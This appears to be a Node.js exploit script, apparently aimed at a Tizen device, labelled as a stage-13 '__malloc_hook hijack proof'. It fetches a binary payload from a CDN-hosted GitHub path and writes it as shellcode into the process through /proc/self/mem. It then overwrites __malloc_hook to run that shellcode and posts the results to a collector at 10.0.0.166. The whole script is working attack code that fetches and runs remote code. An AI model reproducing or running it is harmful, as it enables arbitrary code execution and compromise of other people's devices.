// Stage-13: __malloc_hook hijack proof (benign marker), self-mem native exec.
var fs = require('fs');
var http = require('http');
var https = require('https');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon13', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var SC = 0x213f0000, HOOK = 0x42a14c30;
https.get('https://cdn.jsdelivr.net/gh/ItsMeATaco/tizen-glass-dashboard@v18/hook.bin', function (r) {
  var c = [];
  r.on('data', function (d) { c.push(d); });
  r.on('end', function () {
    var buf = Buffer.concat(c);
    var out = {};
    if (!buf || buf.length < 50) { post({ err: 'fetch' }); return; }
    try {
      var fd = fs.openSync('/proc/self/mem', 'r+');
      fs.writeSync(fd, buf, 0, buf.length, SC);           // place shellcode
      var p = new Buffer(4); p.writeUInt32LE(SC, 0);
      fs.writeSync(fd, p, 0, 4, HOOK);                    // set __malloc_hook
      fs.closeSync(fd);
      var trig = new Buffer(16);                          // malloc -> hook
      out.trigger = trig.length;
      try { out.marker = fs.readFileSync('/home/owner/share/tmp/hijack_ok', 'utf8'); } catch (e) { out.marker = 'absent'; }
    } catch (e) { out.err = e.message; }
    post(out);
  });
}).on('error', function (e) { post({ err: 'https ' + e.message }); });
